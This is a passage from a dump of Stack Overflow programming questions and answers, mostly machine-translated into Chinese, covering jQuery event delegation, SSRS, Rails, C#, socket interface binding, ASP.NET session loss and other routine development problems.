 $('.cell-form').on('submit', function() {
        $.ajax({ 
            type: $(this).attr('method'), 
            url: this.action, 
            data: $(this).serialize(),
            context: this,
            success: function(data, status) {
               //Do stuff
            }
        });
        return false;
    }); 
```

此代码有效，并且此脚本位于**index.html**中，而不是**add.html**中。但是，为什么这段代码，对于**add.html**中的按钮放在**index.html**中时不起作用？：

```
 $("#cell_submit").on('click', function(event){
        alert("LOL");
    }); 
```

我想将我的 JS 放在 index.html 中……而不是 add.html 中。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T13:41:58.713

将事件附加到的元素必须存在于 DOM 上。你需要使用这样的东西

```
$("#cell_modal").on('click', '#cell_submit', function(event){
    alert("LOL");
}); 
```

有关这方面的更多信息，请在[此处查看](http://api.jquery.com/on/)**直接和委托事件部分**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-01T01:30:41.340

您需要首先选择文档。它应该如下所示：

```
$(document).on('click', '#cell_submit', function(event){
    alert("LOL");
}); 
```

# reporting-services - 为 CRM 构建 rdl 报告

> ID：12603055
> 
> 赞同：1
> 
> 时间：2012-09-26T13:38:02.733
> 
> 标签：reporting-services, dynamics-crm-2011, rdl

我正在使用 SQL Server Business Intelligence Development Studio 为 CRM 2011 创建我的第一份报告，并且我已经成功地完成了相当多的工作，但是当我进入更复杂的部分时，我变得卡住了，我想知道是否有人会能够帮助我解决我的一些问题：

1.  我正在使用 fetchXml 从 CRM 获取报告所针对的某些帐户的数据，我需要包含来自子实体的一些数据，但不能以与父实体相同的方式将它们包含到帐户中。因此，为此我假设我需要使用单独的 fetch 查询，但是如何将报告正在查看的帐户的 ID 作为参数传递给第二个 fetch 查询？

2.  一旦我使用 fetchXml 获得了所有子项的名称，那么将它们全部显示在编号列表中的最简单方法是什么？

**编辑：对于 1 和 2，我发现我可以使用包含子数据的子报表。使用列表项，我可以在项目符号列表中显示所有内容，并且可以将参数从主报告传递到子报告**

1.  我在报告中列出了帐户的地址，但由于他们可能会或可能不会完成第 2 行和第 3 行字段，因此我不确定如何在不遗漏某些地址或留下大空白的情况下显示它。我尝试使用第 1、2 和 3 行的不同组合创建不同的文本框，然后使用表达式仅使一个可见，但 iif 语句始终返回 false。有没有更简单的方法来做到这一点？

**编辑：我发现了如何使用包含不同组合的许多不同文本框来执行此操作，并使用可见性规则隐藏它们。最初令人困惑的是，规则是关于是否应该隐藏该框，而不是是否应该显示它**

1.  当我在报告中添加一个字段时，它总是有一个“First()”语句。这是必需的还是会以任何方式限制我的报告？

**编辑：这似乎对报告没有影响，因为总是事先选择运行它的记录，所以 First() 语句不限制任何数据**

如果有人可以帮助我解决这些问题中的任何一个，那将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T10:07:06.357

我找到了我的问题的答案，我把它们放在原来的帖子里。

# javascript - 移动 safari：从全屏页面，如何在普通 safari 窗口中打开页面？

> ID：12603058
> 
> 赞同：0
> 
> 时间：2012-09-26T13:38:10.540
> 
> 标签：javascript, html, mobile-safari

标题说明了一切：我的页面以全屏模式运行（参见使用跳板上的图标）；当我单击指向外部页面的链接时，我希望它在正常的 Safari 应用程序中打开，而不是在全屏实例中打开。如何才能做到这一点？

我希望 window.open('url', '_blank') 能做到这一点，但事实并非如此。

谢谢！

编辑：代码片段：

```
 $('#gotoWebsitePlaceholder').selectable({

            start: function(){

                window.open('http://www. ... .com', "_blank");
            }
        }).hide(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:02:01.323

你在使用锚标签吗？我的经验是默认操作是在 Safari 应用程序中打开 href 目标。IE，如果我没有通过 javascript 取消默认操作，我的应用程序将移出 FS 应用程序。你可以发布一个代码片段吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-30T21:08:03.393

我发现 Safari 在执行 window.open(myURL) 或 this.location = myURL 时会保持全屏显示。但是，如果使用 click 调用您的 url，它将退出全屏模式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-24T11:01:34.410

我用这段 js 解决了（在 iOS 5.1.1 的 ipad 中测试）：

```
jQuery(document).ready(function ($) {
    $('a').click(function() {
      if (($(this).attr("target")!="_blank")){
        window.location = $(this).attr('href');
        return false;
      }
  }); 
```

所以只有带有 target="_blank" 的链接才会在 safari 中打开。

# ruby-on-rails - Rails 教程 User.save

> ID：12603060
> 
> 赞同：2
> 
> 时间：2012-09-26T13:38:14.840
> 
> 标签：ruby-on-rails, ruby

我正在编写 Michael Hartl 的教程（第 6 章）。当我尝试在 rails 控制台中创建新用户时：

```
user = User.new(name: "Lord of Darkness", email: "LoD@hell.com") 
```

我得到：

```
 => #<User id: nil, name: "Lord of Darkness", email: "LoD@hell.com",
 created_at: nil, updated_at: nil, password_digest: nil> 
```

这似乎是正确的。但是当我尝试保存时，我得到了这个：

```
irb(main):007:0> user.save
  ←[1m←[36m (0.0ms)←[0m  ←[1mbegin transaction←[0m
  ←[1m←[35mUser Exists (0.0ms)←[0m  SELECT 1 AS one FROM "users" WHERE LOWER("us
  ers"."email") = LOWER('mhartl@example.com') LIMIT 1
  ←[1m←[36m (0.0ms)←[0m  ←[1mrollback transaction←[0m
  => false 
```

这绝对不是我想要的。我的 user_spec 正在通过所有测试。我的*user.rb*看起来像这样：

```
class User < ActiveRecord::Base
  attr_accessible :email, :name, :password, :password_confirmation
  has_secure_password

  before_save { |user| user.email = email.downcase }

  validates :name,  presence: true, length: { maximum: 50 }
  VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i
  validates :email, presence: true, format: { with: VALID_EMAIL_REGEX },
             uniqueness: { case_sensitive: false }
  validates :password, presence: true, length: { minimum: 6 }
  validates :password_confirmation, presence: true
end 
```

**是什么导致了这个保存问题？**如果不解决此错误，我将无法继续本教程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:16:18.337

我相信您的错误源于`User`您正在创建的没有密码的事实。

您的`User`模型验证密码并要求其存在，但是当您`User`从命令行创建新的 a 时，他/她还没有密码。

# c# - WinForms.Charting 抑制自动生成图例

> ID：12603064
> 
> 赞同：3
> 
> 时间：2012-09-26T13:38:35.690
> 
> 标签：c#, winforms, charts

我正在使用`System.Windows.Forms.DataVisualization.Charting.Chart`该类来绘制包含一些数据的图表。

现在我想抑制图例中条目的自动生成，并用自定义项目替换它们。我已经找到了添加自定义项目的方法，但无法抑制自动生成。

我的代码：

```
var legend = new Legend();
legend.LegendStyle = LegendStyle.Table;
legend.TableStyle = LegendTableStyle.Wide;
legend.IsEquallySpacedItems = true;
legend.IsTextAutoFit = true;
legend.BackColor = Color.White;
legend.Font = new Font(Config.FontFamily, 9);
legend.Docking = Docking.Bottom;
legend.Alignment = StringAlignment.Center;

legend.CustomItems.Add(new LegendItem("test", Color.Green, string.Empty));

ch.Legends.Add(legend); 
```

有没有人做过这样的事情？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T13:59:55.627

尝试在此事件中执行此操作：

```
private void chart1_CustomizeLegend(object sender, CustomizeLegendEventArgs e)
{
    e.LegendItems.Clear();
    // new stuff
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-06-11T09:18:41.443

转到`Series`图表属性中的集合，找到该`IsVisibleInLegend`属性并将其设置为`false`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-02T22:30:07.593

我知道这很旧，但想在这里发布，以防有​​人想要稍微不同的方式来解决它，这是基于 Steve Wellens 的回答，但不是在事件中添加项目，而是删除非自定义项目。

```
 protected void chartarea1_CustomizeLegend(object sender, System.Web.UI.DataVisualization.Charting.CustomizeLegendEventArgs e)
    {
        int customItems = ((Chart)sender).Legends[0].CustomItems.Count();
        if (customItems>0)
        {
            int numberOfAutoItems = e.LegendItems.Count()-customItems;
            for (int i = 0; i < numberOfAutoItems; i++)
            {
                e.LegendItems.RemoveAt(0);
            }
        }

    } 
```

# linux - PHP CLI 超时问题

> ID：12603067
> 
> 赞同：0
> 
> 时间：2012-09-26T13:38:54.743
> 
> 标签：linux, timeout, php

我有一个不断超时的 PHP CLI 脚本，我无法弄清楚超时的来源。看似“随机”的脚本将停止（日志中没有 PHP 错误）并将以下输出提供给控制台：

```
timeout, elapsed_time = 60 
```

我正在间歇性地设置 PHP 的时间限制，`set_time_limit(0);`但似乎没有什么不同。

除此之外，如果 PHP 超时，它应该抛出一个错误，并且没有抛出任何错误，那么这个超时是否可以由 PHP 以外的其他东西触发？

该脚本由 Ubuntu 机器上的 bash 脚本“.sh”启动。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T17:09:40.493

感谢所有帮助过我的人。

我尝试运行脚本`nohup`，超时问题似乎已经消失。希望这对其他人有帮助！

# django - django 按名称而不是内容翻译变量

> ID：12603070
> 
> 赞同：0
> 
> 时间：2012-09-26T13:39:01.440
> 
> 标签：django, internationalization

我想使用 django i18n 系统来翻译我网站的内容。

这个目的之一就是`<meta keywords="word1, word2">`标签。目前我正在翻译`"word1, word2"`字符串，但如果我改变它，其余的翻译将无法工作。

最好的办法是设置变量并说翻译系统“使用此变量内容的英文版本”。

我想避免在数据库中设置它，因为这可以在模板或其他 html/python 文件中指定。我想避免额外的数据库/缓存命中。

有什么方法可以显示不同语言版本的变量 - 而不是内容？

我知道这可以通过包含带有`{% if LANGUAGE_CODE == "xx" %}`条件的模板来完成，但也许还有其他方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:32:24.603

使用占位符文本并创建一个`en.po`文件，其中只有一个包含值的翻译。请注意，您将负责让翻译人员了解英语内容，而不是将其包含在相应的 .po 文件中。

```
<meta keywords={% trans "META KEYWORDS" %} /> 
```

# c# - regarding app.config

> ID：12603073
> 
> 赞同：0
> 
> 时间：2012-09-26T13:39:19.880
> 
> 标签：c#

I have this

```
<?xml version="1.0"?>
<configuration>
  <configSections>
    <section name="FBI" type="System.Configuration.NameValueSectionHandler" />
  </configSections>
  <FBI>
    <add key="FilePath" value="D:\C Drive\Desktop\test1.txt"/>
  </FBI>
<configuration> 
```

in `app.config`..

And I set the `Copy to Output Directory` for `app.config` to copy if newer.

In the program,

```
 var section = ConfigurationManager.GetSection("FBI") as NameValueCollection;
            FilePath.Text = section["FilePath"]; 
```

where `FilePath` is a label.

When I change the config file to

```
D:\C Drive\Desktop\test2.txt 
```

and build using VS (release mode), it shows correctly as

```
D:\C Drive\Desktop\test2.txt 
```

But if I change the app.config in release folder to

```
D:\C Drive\Desktop\test3.txt 
```

and run using the exe file in the release folder directly, it still shows me

```
D:\C Drive\Desktop\test1.txt 
```

without updating to `test3.txt`

What's the reason?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T13:54:16.063

> 如果更新，我将 app.config 的复制设置为输出目录以进行复制。

您不需要这样做：它将自动复制到`AppName.exe.config`输出文件夹中。您需要修改的是这个文件。

# twitter-bootstrap - 如何使 Twitter Bootstrap 模态动画更快？

> ID：12603082
> 
> 赞同：16
> 
> 时间：2012-09-26T13:40:03.837
> 
> 标签：twitter-bootstrap, twitter-bootstrap-rails

我真的很喜欢 Twitter Bootstrap 模态，但是用动画显示它有点慢。我会说大约500毫秒。

有没有办法让它更快？我看了看，`bootstrap-modal.js`但找不到任何可以提供帮助的令人信服的东西。

而且，我不想完全停用动画，因为我发现这是一个让响应时间在用户眼中看起来更快的好技巧；o)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-26T14:08:37.850

您可以`.fade`按照此处的说明操作该类：
[如何更改 Twitter Bootstrap 中警报消息的淡入淡出速度？](https://stackoverflow.com/questions/10441281/how-can-i-change-the-speed-of-the-fade-for-alert-messages-in-twitter-bootstrap)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-10-04T14:19:46.843

`.modal.fade .modal-dialog`可以通过在 bootstrap.css 中修改来更改幻灯片动画，如下所示： [Modify Bootstrap Modal Transition](https://stackoverflow.com/a/29145881/10887376)

派对迟到了，但是这个问题是谷歌的第一个搜索结果，问题还没有真正得到回答。所以，我认为这可能会对某人有所帮助。干杯!

# c# - C# 异常没有被抛出/捕获

> ID：12603084
> 
> 赞同：1
> 
> 时间：2012-09-26T13:40:12.163
> 
> 标签：c#, exception, dll, .net-assembly

我试图在运行时将与我设置的特定程序集属性匹配的 dll 加载到我的程序中。为了确保在检查其标志之前 dll 是可加载的，我编写了以下方法：

```
private bool IsValidDll(string dll) {
        try {
            System.Reflection.Assembly.LoadFrom(dll);
            return true;
        } catch (Exception ex) { return false; }
    } 
```

我可以遍历当前目录中的 dll 并调用此方法以查看加载 dll 并检查其程序集属性是否安全。但是，我遇到了一个没有抛出/捕获异常并且仍然​​只是直接使程序崩溃的 dll。相关的输出窗口信息如下：

```
LoaderException: System.IO.FileLoadException: Mixed mode assembly is built against 
version 'v2.0.50727' of the runtime and cannot be loaded in the 4.0 runtime without additional configuration information. - Adapters.Spryware.SprywareAdapter
System.Reflection.ReflectionTypeLoadException: Unable to load one or more of the requested types. Retrieve the LoaderExceptions property for more information. 
```

我已经尝试捕获特定的异常（System.IO.FileLoadException），但是仍然跳过了捕获块并且我仍然崩溃。有什么想法吗？

另外，我发现这是检查我的程序集属性的一种非常繁琐的方法。有没有办法检查我的标志而不必先用反射加载 dll？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T13:43:06.033

通过将程序集加载到仅反射上下文中，您可能可以解决此问题并减轻负担。

基本上，这不是完全加载程序集，而是让您能够反映程序集，而无需执行诸如实例化对象之类的事情。这明确地允许您查看针对不同 .NET 框架版本构建的程序集，而不是运行您的应用程序的版本。

MSDN 上提供了彻底的处理：http: [//msdn.microsoft.com/en-us/library/ms172331.aspx](http://msdn.microsoft.com/en-us/library/ms172331.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:52:51.583

不得不承认，我不明白为什么你的代码也不起作用：

我做了一个 .net 4 的东西并跑了，我的确实抓住了它：

```
 private void button1_Click(object sender, EventArgs e)
    {
       // foreach (String file in Directory.GetFiles("c:\\windows", "*.dll"))
        String file = @"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\System.Data.dll";
        {
            try
            {
                //System.Reflection.Assembly.ReflectionOnlyLoadFrom(file);
                System.Reflection.Assembly.LoadFrom(file);
            }
            catch (Exception ee)
            {
                textBox1.Text += ee.Message + Environment.NewLine;
            }
        }
    } 
```

单击文本框时显示：无法加载文件或程序集 'file:///C:\Windows\Microsoft.NET\Framework64\v2.0.50727\System.Data.dll' 或其依赖项之一。试图加载格式不正确的程序。

# sql-server - Office VBA ODBC 到 SQL Server

> ID：12603086
> 
> 赞同：2
> 
> 时间：2012-09-26T13:40:21.373
> 
> 标签：sql-server, vba, odbc, ms-office

我必须使用 VBA 将 Word 文档连接到 SQL Server 才能读取和写入记录。现在，我对连接数据库的许多不同方式感到非常困惑。有 ADO、ODBC 等。我见过非常不同的连接 SQL Server 数据库的方法。一位同事希望我使用 ODBC。

那么：**在 Office VBA 中使用 ODBC 连接到 SQL Server 数据库的最佳方法是什么？**

SELECT 和 INSERT 语句的示例也将不胜感激。

编辑：VB .Net/C# 中没有“System.Data.SqlClient.SqlConnection”和“System.Data.SqlClient.SqlCommand”之类的东西吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T14:40:28.133

此示例使用 ODBC：

```
'Microsoft ActiveX Data Objects x.x library
Dim cn As New ADODB.connection
Dim rs As New ADODB.recordset

    cn.Open "DRIVER={SQL Server};SERVER=srv;" & _
       "trusted_connection=yes;DATABASE=test"

    rs.Open "SELECT * FROM table_1", cn 
```

此示例使用 OleDb

```
'Microsoft ActiveX Data Objects x.x library
Dim cn As New ADODB.connection
Dim rs As New ADODB.recordset

    cn.Open "Provider=sqloledb;Data Source=srv;" & _
      "Initial Catalog=Test;Integrated Security=SSPI;"

    rs.Open "SELECT * FROM table_1", cn 
```

另见： http: [//www.connectionstrings.com/sql-server-2008](http://www.connectionstrings.com/sql-server-2008)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:54:06.470

您的同事可能希望您使用 ODBC 的原因是您的公司为每个工作站提供标准化的 ODBC 连接。

这里的好处是您不必担心除了登录名/密码之外的连接属性，因为它已经设置好了。想象一下 ODBC 在软件（字）和服务器之间起作用，当涉及到公司的变化时，它使事情变得容易得多。（服务器地址可能会改变，IT 能够在最终用户不知道的情况下更改 ODBC 的设置）

Beste 将与您的同事交谈并询问他的担忧。另一个原因可能是 ODBC 可能比 ado 更快。我也有过这样的经历。

# c# - 您可以在 Using 块中处理多个对象吗？

> ID：12603093
> 
> 赞同：28
> 
> 时间：2012-09-26T13:40:35.860
> 
> 标签：c#, .net

如何在 Using 语句中处理多个对象？

**示例代码**

```
using(MyClass obj = new MyClass())
{
    MyOtherClass objOC= new MyOtherClass()
    TextReader objTR = new StringReader(...);  
    // other code
} 
```

`MyClass obj`将被放置在 Using 块的末尾，但是 `MyOtherClass objOC`和`TextReader objTR`. 据我所知，它们不会被处置，所以我应该在那里有一个嵌套的 Using 块，如下所示？如果物体数量增加，我将需要一个真正的宽屏显示器

**以下是正确的吗？**

```
using(MyClass obj = new MyClass())
{
    using (MyOtherClass objOC= new MyOtherClass())
    {
        using (TextReader objTR = new StringReader(...))
        {
           //code using all three objects 
        }   
    } 
    // other code using just `MyClass obj`
} 
```

MyClass 和 MyOtherClass 都实现`IDisposable`

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-09-26T13:42:22.637

是的，您的代码是正确的。以下是您可能需要注意的其他几件事...

您可以在单个 using 语句中声明多个相同类型的对象。从[文档](http://msdn.microsoft.com/en-us/library/yh598w02%28v=vs.80%29.aspx)中：

```
using (Font font3 = new Font("Arial", 10.0f), 
            font4 = new Font("Arial", 10.0f))
{
    // Use font3 and font4.
} 
```

要使用不同类型的多个对象，您可以使用单行语法嵌套以节省空间：

```
using (MyClass obj = new MyClass())
using (MyOtherClass objOC= new MyOtherClass())
using (TextReader objTR = new StringReader(...))
{
    // code using all three objects 
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-26T13:42:22.700

是的，如果你想保证`Dispose(..)`所有这些都被调用，你必须将它们包含在`using`声明中，就像在第二个例子中一样。

或者您可以在单个`using`语句中声明多个对象。这是编码风格和代码流的问题。

# c++ - How to make a TCP socket work with SO_BINDTODEVICE (against routing table)

> ID：12603096
> 
> 赞同：3
> 
> 时间：2012-09-26T13:40:44.667
> 
> 标签：c++, c, sockets, tcp, network-programming

### Background of the question:

On our machine we have multiple network interfaces which lead to different networks. There are possible overlapping IP addresses (e.g. two different machines in two different networks with the same IP address). So when we want to connect with specific peer then we need to specify not only it's IP address but also our network interface which lead to the proper network. We want to write application in C/C++ able to connect with specific peers via TCP.

### Question:

I'm trying to make a TCP connection using socket with SO_BINDTODEVICE set. Here is a simplified snippet:

```
sockfd = socket(AF_INET, SOCK_STREAM, 0);
setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, interface_name,
    strlen(interface_name));
connect(sockfd, (sockaddr *) &serv_addr, sizeof(serv_addr)); 
```

(I know about struct ifreq, but it seems that only the first field in it (ifr_name field is in use). So I can pass only name of the interface.)

*   If forced interface is the same as interface according to the routing table, then everything works correctly.
*   If forced interface is different, then (tested with Wireshark):
    1.  SYN is sent from forced interface to desired peer.
    2.  SYN,ACK from desired peer is received on forced interface.
    3.  ACK is not sent from forced interface and connection is not established. (And goto step 2.)

How to check where SYN,ACK or ACK is rejected by our system? And how correctly force TCP socket to make connection using specific interface (against routing table)?

Maybe there are some other, more convenient ways to create TCP connection on desired interface?

Thanks!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T08:05:16.043

我知道这不是您的答案，但是您可以禁用其他接口并仅启用您想要的网络，在您的情况下，您似乎需要所有接口，但我认为这种方法可以帮助其他人。您可以使用以下方式启用/禁用网络接口：

使能够

```
ifr.ifr_flags = true; 
strcpy(ifr.ifr_name, "eth0"); //you could put any interface name beside "eth0" 
res = ioctl(sockfd, SIOCSIFFLAGS, &ifr); 
```

对于禁用，您只需将标志设置为 false，其余代码相同：

> ifr.ifr_flags = 真；

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T19:50:18.780

不要使用 SO_BINDTODEVICE。它并非在所有平台上都受支持，并且有一种更简单的方法。

而是将套接字绑定到要用于连接到远程端的正确网络上的本地 IP 地址。

IE，

```
sockfd = socket(AF_INET, SOCK_STREAM, 0);

struct sockaddr_in sin;
memset(&sin, 0, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_port = 0; //Auto-determine port.
sin.sin_addr.s_addr = inet_addr("192.168.1.123"); //Your IP address on same network as peer you want to connect to

bind(sockfd, (sockaddr*)&sin, sizeof(sin)); 
```

然后调用连接。

对于服务器端，除了指定端口而不是 0 之外，您会做同样的事情，然后调用监听而不是连接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-01-17T14:31:45.070

这是内核配置的一个问题——在许多发行版上，默认情况下它被配置为在这种特定情况下拒绝传入的数据包。

[我在另一个类似问题的答案中](https://stackoverflow.com/a/24019586)找到了解决这个问题的方法：

> 要允许这样的流量，你必须在你的机器上设置一些变量（作为 root）：
> 
> ```
> sysctl -w net.ipv4.conf.all.accept_local=1
> sysctl -w net.ipv4.conf.all.rp_filter=0
> sysctl -w net.ipv4.conf.your_nic.rp_filter=0 
> ```
> 
> `your_nic`接收数据包的网络接口在哪里。注意同时更改`net.ipv4.conf.all.rp_filter`和`net.ipv4.conf.your_nic.rp_filter`，否则它将不起作用（内核默认为最严格的设置）。

# apache - Fresh installation of Apache and Symfony2, error: Container extension "security" is not registered

> ID：12603099
> 
> 赞同：2
> 
> 时间：2012-09-26T13:40:56.583
> 
> 标签：apache, symfony

I've got a problem with Symfony2\. Because I want to use wincache in Windows 8, I have to install php NTS. So I've installed Apache 2.4.3 from:

[http://www.apachelounge.com/download/](http://www.apachelounge.com/download/)

and php 5.4.7 NTS. This is configuration of fcgi in httpd.conf:

```
LoadModule fcgid_module modules/mod_fcgid.so

<IfModule mod_fcgid.c>
    AddHandler fcgid-script .fcgi .php
    FcgidInitialEnv PHPRC "c:/serwer/php"
    FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000
    FcgidMaxRequestsPerProcess 1000
    FcgidMaxProcesses 15
    FcgidIOTimeout 120
    FcgidIdleTimeout 120
    FcgidWrapper "c:/serwer/php/php-cgi.exe" .php
    AddType application/x-httpd-php .php
</IfModule> 
```

I downloaded a Symfony 2.1.2\. File config.php from Symfony/web/ says that "Your configuration looks good to run Symfony.". But when I want to run app_dev.php, I've got:

```
LogicException: Container extension "security" is not registered. 
```

# wpf - Any tutorials, code help to implement Drag and drop functionality in WPF using MVVM

> ID：12603107
> 
> 赞同：0
> 
> 时间：2012-09-26T13:41:41.507
> 
> 标签：wpf, mvvm

I am using System.Windows.Interactivity to map mouse events in ViewModels. Any tutorials, code help to implement Drag and drop functionality in WPF using MVVM.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T16:30:07.437

这里有很好的教程：

[教程](http://siderite.blogspot.com/2011/01/mvvm-drag-and-drop-part-1.html)
[1 教程](http://www.codeproject.com/Articles/420545/WPF-Drag-and-Drop-MVVM-using-Behavior)
[2 教程3](http://www.wpfsharp.com/2012/03/22/mvvm-and-drag-and-drop-command-binding-with-an-attached-behavior/)
[教程4](http://blogs.imeta.co.uk/jyoung/archive/2009/07/21/728.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:59:11.617

wpftutorial.net 有一个[拖放](http://wpftutorial.net/DragAndDrop.html)教程。

您还可以找到关于 codeplex 的两部分教程。（[第 1](http://www.codeproject.com/Articles/43614/Drag-and-Drop-in-WPF)部分，[第 2 部分](http://www.codeproject.com/Articles/43702/Drag-and-Drop-in-WPF-Part-II)）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T08:59:43.583

[http://sharpfellows.com/post/WPF-Drag-and-Drop-e28093-doing-it-the-MVVM-way.aspx](http://sharpfellows.com/post/WPF-Drag-and-Drop-e28093-doing-it-the-MVVM-way.aspx)

# c# - how to add multiple non continuous lines with x-as overlap in a mschart

> ID：12603109
> 
> 赞同：1
> 
> 时间：2012-09-26T13:41:46.337
> 
> 标签：c#, winforms, data-binding, plot, mschart

I'n not really familiar with ms chart and have been googleing throughout the day to find an example of what I need, but was not able to find it.

I would like to be able to plot multiple lines on a chart like this:

![enter image description here](../Images/3e94082e560f75c723873c7826caaa1b.png)

(this is done manually, just to make clear what I need).

I can calculate each value the line has per x value per line. I store it in a list which hold the DateAndValue object:

```
[Serializable]
public struct DateAndValue
{
    public uint DBDate { get; set; }
    public double Value { get; set; }
    public int BarNumber { get; set; }
} 
```

As you can see, it's not really possible to use one list for support lines and one for resistance, because there might be multiple lines of the same sort (i.e. support) in the same period.

What would be a good way of storing (must be update-able) the data and plot it in the chart, without having zero values when there is no data.

I could also make an object that only contains start and end point per line. In that case I would just update the end value if necessary.

Suggestions would be highly appreciated. Kind regards,

Matthijs

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-28T22:04:58.673

不久前，我问了一个关于如何创建烛台图的堆栈溢出问题，答案和我的问题应该一起引导你走向正确的方向

这是网址：

[烛台-多个 y 值](https://stackoverflow.com/questions/12983199/candlestick-multiple-y-values)

如何在图表中制作趋势线？我的猜测是你可以用 2 个点为每条线添加一个新系列（也许通过选择 2 个不同的蜡烛），通常你可以用实线、虚线等填充 2 个点之间的“缺失”点。

我希望比我更有经验的人能给你更好的答案！

# c# - 会话变量丢失 - 单例实例变为空

> ID：12603110
> 
> 赞同：0
> 
> 时间：2012-09-26T13:41:48.773
> 
> 标签：c#, asp.net, singleton, session-variables, session-timeout

我正在使用 ASP.NET 开发一个 Web 应用程序。我有一个名为“Sistema”的类，它使用单例模式。

创建 Sistema 实例时，会打开数据库连接并运行一个进程，该进程会加载一些静态信息以供以后使用。这持续了将近 2 分钟。

```
private static Sistema instance;
private Sistema()
{
    OpenDataBase();
    LoadStaticInformation();
}

public static Sistema GetInstance()
{
    if (instance == null)
    {
        instance = new Sistema();
    }
    return instance;
} 
```

我保持与数据库的连接打开的原因是因为我使用的是 db4o，这强烈暗示了这一点。以下是一些参考资料：

[从 db 查询对象的 db4o 最佳实践](https://stackoverflow.com/questions/5996892/db4o-best-practice-to-query-objects-from-db#answer-5998767)

[是否可以多次打开 DB4o 文件进行查询、插入、更新？](https://stackoverflow.com/questions/2998794/is-it-ok-to-open-a-db4o-file-for-query-insert-update-multiple-times#answer-3001247)

[查询有关 db4o 中的数据库连接性](https://stackoverflow.com/questions/5620414/query-regarding-database-connectivity-in-db4o#answer-5624954)

在我的 Web 应用程序上，我有一个母版页，通过检查 Session 变量来控制用户是否登录。如果此 Session 为空，则将用户发送到登录页面。

在登录页面上，我要做的第一件事是检查“Sistema”的实例是否为空。如果是，那么当用户点击提交按钮时，会显示一条消息，上面写着“登录可能需要最多两分钟。请稍候”。如果它不为空，则不会显示任何消息，因为登录操作只需几秒钟。

用户告诉我，在通过系统时，他们有时会被送回登录页面，当他们尝试登录时，会显示“登录可能需要最多两分钟”的消息，并且确实需要登录一会儿。

它们被发送回登录页面的事实意味着会话变量丢失，并且正在显示的消息意味着“Sistema”的实例也为空。

为了确定发生这种情况的原因，我创建了一个网页，当检测到 Sistema 实例为空时，它会向我发送一封电子邮件。我想如果我能知道这件事发生的时间，我可能会发现发生了什么。

这个网页真的很简单。它每 10 分钟运行一次并检查 Sistema 的实例是否为空。如果是，则发送一封电子邮件并创建 Sistema 实例。

```
bool isInstanceNull = Sistema.IsInstanceNull();
if (isInstanceNull)
{
    String emailTo = "...";
    String emailContent = "...";
    Functions.SendMail(emailTo, "Sistema is null", emailContent, "");

    Sistema.GetInstance();
    Functions.SendMail(emailTo, "Sistema has been created", emailContent, "");
} 
```

我发现的唯一一件事是它不是在特定时间发生的。例如，上周发生在晚上 7 点左右，但今天发生在凌晨 2 点。

关于会话超时，我在后面的代码中使用了一个解决方案：[http](http://www.beansoftware.com/ASP.NET-Tutorials/Keep-Session-Alive.aspx) ://www.beansoftware.com/ASP.NET-Tutorials/Keep-Session-Alive.aspx 。

关于为什么会发生这种情况的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T13:55:56.420

应用程序池具有使其每 N 分钟（默认为 1740 或每 29 小时）自动回收的属性。将其设为零以禁用回收。该属性位于“回收”标题下（在 IIS7 上），称为“常规时间间隔（分钟）”

![在此处输入图像描述](../Images/73ee99dcd7397a8b6f5f63153f7f2978.png)

除此之外，您应该**始终**立即关闭连接，并且在 ASP.NET 中根本不使用`static`连接（当默认启用连接池时）。

我提到它是因为：

```
private static Sistema instance;
private Sistema()
{
    OpenDataBase();
    LoadStaticInformation();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:59:04.597

您不应保持与数据库的连接处于打开状态。通常，每个请求都会打开一个新连接。也许数据库有时会决定它有太多用户或连接打开时间过长，结果它关闭了连接并且您的对象崩溃了。与数据库的开放连接也是一种安全风险。

不过，我不是100％确定这一点......

您可能应该将连接到数据库向下移动到某种查询执行方法。此外，一次加载这样一大堆数据似乎是不明智的，您不能在后台执行此操作还是仅加载用户当时需要查看的信息？

# https - Nginx reverse proxy for websocket and normal HTTP traffic with ssl

> ID：12603115
> 
> 赞同：0
> 
> 时间：2012-09-26T13:42:04.010
> 
> 标签：https, nginx, websocket, mojolicious

> **Possible Duplicate:**
> [Can nginx be used as a reverse proxy for a backend websocket server?](https://stackoverflow.com/questions/2419346/can-nginx-be-used-as-a-reverse-proxy-for-a-backend-websocket-server)

